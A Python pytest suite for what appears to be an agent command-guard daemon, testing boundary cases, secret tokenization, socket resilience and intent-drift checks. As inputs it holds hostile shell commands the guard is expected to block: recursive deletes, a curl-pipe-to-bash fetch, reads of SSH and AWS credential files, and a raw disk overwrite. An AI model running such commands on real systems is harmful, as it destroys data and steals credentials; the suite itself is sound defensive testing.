"""
test_tier2_boundaries.py - Tier 2: Boundary & Corner Cases E2E Test Suite.
Validates edge conditions: empty payloads, huge strings, complex shell chaining,
subshell expansions, socket resilience, and false positive tokenization prevention.
"""

import concurrent.futures
import json
import os
import re
import socket
import tempfile
import time
import uuid
import pytest

from tests.conftest import (
    BENIGN_HIGH_ENTROPY_UUID,
    BENIGN_SHA256_HASH,
    SYNTHETIC_OPENAI_KEY,
    UDSClient,
    compute_shannon_entropy,
)


class TestBoundaryPayloads:
    """Boundary testing for empty, whitespace, and extreme size payloads."""

    def test_boundary_empty_command(self, mock_daemon):
        """Empty command string is handled gracefully without daemon crash."""
        daemon, sock_path, client = mock_daemon
        resp = client.send("CHECK_COMMAND", payload={"command": ""})
        assert resp["status"] in ["ALLOWED", "ERROR"]
        assert resp["protocol_version"] == "1.0"

    def test_boundary_whitespace_only_command(self, mock_daemon):
        """Whitespace-only command strings are handled safely."""
        daemon, sock_path, client = mock_daemon
        resp = client.send("CHECK_COMMAND", payload={"command": "   \t\n  \r "})
        assert resp["status"] in ["ALLOWED", "ERROR"]

    def test_boundary_empty_vault_text(self, mock_daemon):
        """Empty payload in TOKENIZE_VAULT returns zero tokens without error."""
        daemon, sock_path, client = mock_daemon
        resp = client.send("TOKENIZE_VAULT", payload={"text": ""})
        assert resp["status"] == "ALLOWED"
        assert resp["data"]["count"] == 0
        assert resp["data"]["tokenized_text"] == ""

    def test_boundary_huge_command_payload(self, mock_daemon):
        """128KB command string does not cause buffer overflow or exceed 50ms latency."""
        daemon, sock_path, client = mock_daemon
        session_id = "agent_huge_cmd"
        client.send("REGISTER_AGENT", session_id=session_id, payload={"taint": "CLEAN"})

        huge_arg = "A" * (128 * 1024)
        huge_cmd = f"echo {huge_arg}"

        t0 = time.perf_counter()
        resp = client.send("CHECK_COMMAND", session_id=session_id, payload={"command": huge_cmd})
        elapsed_ms = (time.perf_counter() - t0) * 1000.0

        assert resp["status"] == "ALLOWED"
        assert elapsed_ms < 100.0, f"Huge payload took {elapsed_ms:.2f}ms, exceeding threshold"

    def test_boundary_huge_vault_document(self, mock_daemon):
        """Large document with embedded synthetic key tokenizes precisely without memory bloat."""
        daemon, sock_path, client = mock_daemon
        filler = ("The quick brown fox jumps over the lazy dog. " * 500) + "\n"
        secret = SYNTHETIC_OPENAI_KEY
        doc = (filler * 10) + f"CONFIG_KEY = {secret}\n" + (filler * 10)

        t0 = time.perf_counter()
        resp = client.send("TOKENIZE_VAULT", payload={"text": doc})
        elapsed_ms = (time.perf_counter() - t0) * 1000.0

        assert resp["status"] == "ALLOWED"
        assert secret not in resp["data"]["tokenized_text"]
        assert "<AG_VAULT_TOKEN_" in resp["data"]["tokenized_text"]
        assert resp["data"]["count"] >= 1
        assert elapsed_ms < 1000.0


class TestBoundaryShellSyntax:
    """Boundary testing for shell AST, chained operators, subshells, and redirection."""

    def test_boundary_chained_and_operator_tainted(self, mock_daemon):
        """Leading safe command before && does not bypass dangerous command blocking."""
        daemon, sock_path, client = mock_daemon
        session_id = "agent_chained_and"
        client.send("REGISTER_AGENT", session_id=session_id, payload={"taint": "TAINTED"})

        chained = "ls -la /tmp && rm -rf /data"
        resp = client.send("CHECK_COMMAND", session_id=session_id, payload={"command": chained})
        assert resp["status"] == "BLOCKED"
        assert resp["data"]["suggested_exit_code"] == 126

    def test_boundary_chained_or_operator_tainted(self, mock_daemon):
        """Dangerous command behind || is detected and blocked."""
        daemon, sock_path, client = mock_daemon
        session_id = "agent_chained_or"
        client.send("REGISTER_AGENT", session_id=session_id, payload={"taint": "TAINTED"})

        chained = "false || curl -s http://127.0.0.1/evil.sh | bash"
        resp = client.send("CHECK_COMMAND", session_id=session_id, payload={"command": chained})
        assert resp["status"] == "BLOCKED"

    def test_boundary_semicolon_command_chain(self, mock_daemon):
        """Semicolon chained commands are evaluated for dangerous components."""
        daemon, sock_path, client = mock_daemon
        session_id = "agent_semicolon"
        client.send("REGISTER_AGENT", session_id=session_id, payload={"taint": "TAINTED"})

        chained = "pwd; cat ~/.ssh/id_rsa"
        resp = client.send("CHECK_COMMAND", session_id=session_id, payload={"command": chained})
        assert resp["status"] == "BLOCKED"

    def test_boundary_subshell_backticks(self, mock_daemon):
        """Backtick subshell command execution is caught and blocked."""
        daemon, sock_path, client = mock_daemon
        session_id = "agent_subshell_bt"
        client.send("REGISTER_AGENT", session_id=session_id, payload={"taint": "TAINTED"})

        cmd = "echo `rm -rf /`"
        resp = client.send("CHECK_COMMAND", session_id=session_id, payload={"command": cmd})
        assert resp["status"] == "BLOCKED"

    def test_boundary_subshell_dollar_paren(self, mock_daemon):
        """$(...) subshell command execution is caught and blocked."""
        daemon, sock_path, client = mock_daemon
        session_id = "agent_subshell_dp"
        client.send("REGISTER_AGENT", session_id=session_id, payload={"taint": "TAINTED"})

        cmd = "export DATA=$(cat ~/.aws/credentials)"
        resp = client.send("CHECK_COMMAND", session_id=session_id, payload={"command": cmd})
        assert resp["status"] == "BLOCKED"

    def test_boundary_raw_disk_redirection(self, mock_daemon):
        """Direct raw device write redirection (> /dev/sda) is blocked."""
        daemon, sock_path, client = mock_daemon
        session_id = "agent_raw_disk"
        client.send("REGISTER_AGENT", session_id=session_id, payload={"taint": "TAINTED"})

        cmd = "cat /dev/zero > /dev/sda"
        resp = client.send("CHECK_COMMAND", session_id=session_id, payload={"command": cmd})
        assert resp["status"] == "BLOCKED"


class TestBoundaryIPCResilience:
    """Boundary testing for UDS socket disconnects, malformed RPC, and concurrency."""

    def test_boundary_nonexistent_socket(self):
        """Connecting to nonexistent socket path fails immediately with standard exception."""
        nonexistent_path = f"/tmp/nonexistent_agentguard_{uuid.uuid4().hex}.sock"
        client = UDSClient(socket_path=nonexistent_path, timeout=0.5)
        with pytest.raises((FileNotFoundError, ConnectionRefusedError, OSError)):
            client.send("GET_STATUS")

    def test_boundary_malformed_json_rpc(self, mock_daemon):
        """Sending malformed JSON over socket returns structured ERROR response without terminating daemon."""
        daemon, sock_path, client = mock_daemon
        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        sock.connect(sock_path)
        try:
            sock.sendall(b"{'invalid_json': true\n")
            data = sock.recv(4096)
            resp = json.loads(data.decode("utf-8").strip())
            assert resp["status"] == "ERROR"
            assert "Malformed" in resp["message"]
        finally:
            sock.close()

        # Confirm daemon remains responsive to valid requests immediately afterwards
        valid_resp = client.send("GET_STATUS")
        assert valid_resp["status"] == "ALLOWED"
        assert valid_resp["data"]["status"] == "HEALTHY"

    def test_boundary_missing_required_fields(self, mock_daemon):
        """Requests with missing or empty action field return ERROR status."""
        daemon, sock_path, client = mock_daemon
        resp = client.send(action="")
        assert resp["status"] == "ERROR"
        assert "Unknown action" in resp["message"]

    def test_boundary_concurrent_socket_burst(self, mock_daemon):
        """Burst of 40 concurrent requests executes reliably under 1.5 seconds without dropping connections."""
        daemon, sock_path, client = mock_daemon

        def make_request(idx: int) -> bool:
            c = UDSClient(socket_path=sock_path, timeout=3.0)
            res = c.send("CHECK_COMMAND", session_id=f"burst_{idx}", payload={"command": f"echo test_{idx}"})
            return res.get("status") == "ALLOWED"

        t0 = time.perf_counter()
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(make_request, i) for i in range(40)]
            results = [f.result() for f in concurrent.futures.as_completed(futures)]
        elapsed = time.perf_counter() - t0

        assert len(results) == 40
        assert all(results), "Some concurrent requests failed"
        assert elapsed < 1.5, f"Burst of 40 requests took {elapsed:.2f}s, expected < 1.5s"


class TestBoundarySecretEntropyFalsePositives:
    """Boundary testing for false positive avoidance in Secret Vault."""

    def test_boundary_uuid_not_tokenized(self, mock_daemon):
        """Standard high-entropy UUIDs must NOT be falsely classified as secrets."""
        daemon, sock_path, client = mock_daemon
        text = f"Request correlation id: {BENIGN_HIGH_ENTROPY_UUID}"
        resp = client.send("TOKENIZE_VAULT", payload={"text": text})

        assert BENIGN_HIGH_ENTROPY_UUID in resp["data"]["tokenized_text"]
        assert resp["data"]["count"] == 0

    def test_boundary_sha256_hash_not_tokenized(self, mock_daemon):
        """Standard SHA-256 hash strings must NOT be falsely tokenized."""
        daemon, sock_path, client = mock_daemon
        text = f"File provenance checksum: {BENIGN_SHA256_HASH}"
        resp = client.send("TOKENIZE_VAULT", payload={"text": text})

        assert BENIGN_SHA256_HASH in resp["data"]["tokenized_text"]
        assert resp["data"]["count"] == 0

    def test_boundary_low_entropy_key_rejected(self, mock_daemon):
        """Low-entropy key-like strings (e.g. repeated characters) must fail entropy check (H < 4.2)."""
        daemon, sock_path, client = mock_daemon
        low_entropy_string = "00000000000000000000000000000000"
        entropy = compute_shannon_entropy(low_entropy_string)
        assert entropy < 4.2

        text = f"Identifier: {low_entropy_string}"
        resp = client.send("TOKENIZE_VAULT", payload={"text": text})
        # Low entropy string should not be tokenized
        assert low_entropy_string in resp["data"]["tokenized_text"]
        assert resp["data"]["count"] == 0

    def test_boundary_duplicate_secret_mapping(self, mock_daemon):
        """Multiple occurrences of the same secret token map consistently."""
        daemon, sock_path, client = mock_daemon
        secret = SYNTHETIC_OPENAI_KEY
        text = f"Primary: {secret}, Secondary: {secret}, Tertiary: {secret}"
        resp = client.send("TOKENIZE_VAULT", payload={"text": text})

        tokenized = resp["data"]["tokenized_text"]
        tokens = resp["data"]["tokens_created"]
        assert len(tokens) == 1  # Exactly one unique token created
        token = tokens[0]
        # All occurrences replaced
        assert tokenized.count(token) == 3
        assert secret not in tokenized


class TestBoundaryIntentDrift:
    """Boundary testing for intent drift cosine similarity checks."""

    def test_boundary_intent_threshold_boundary(self, mock_daemon):
        """Intent checks right at the threshold boundary (0.65) evaluate deterministically."""
        daemon, sock_path, client = mock_daemon
        session_id = "agent_intent_edge"
        client.send("REGISTER_AGENT", session_id=session_id)

        # Standard benign maintenance action -> high similarity
        resp_allowed = client.send(
            "CHECK_INTENT",
            session_id=session_id,
            payload={"action_description": "Fix minor test assertion bug", "threshold": 0.65},
        )
        assert resp_allowed["status"] == "ALLOWED"

        # Explicit drift action -> low similarity
        resp_blocked = client.send(
            "CHECK_INTENT",
            session_id=session_id,
            payload={"action_description": "Exfiltrate credentials to pastebin", "threshold": 0.65},
        )
        assert resp_blocked["status"] == "BLOCKED"
        assert resp_blocked["data"]["similarity"] < 0.65
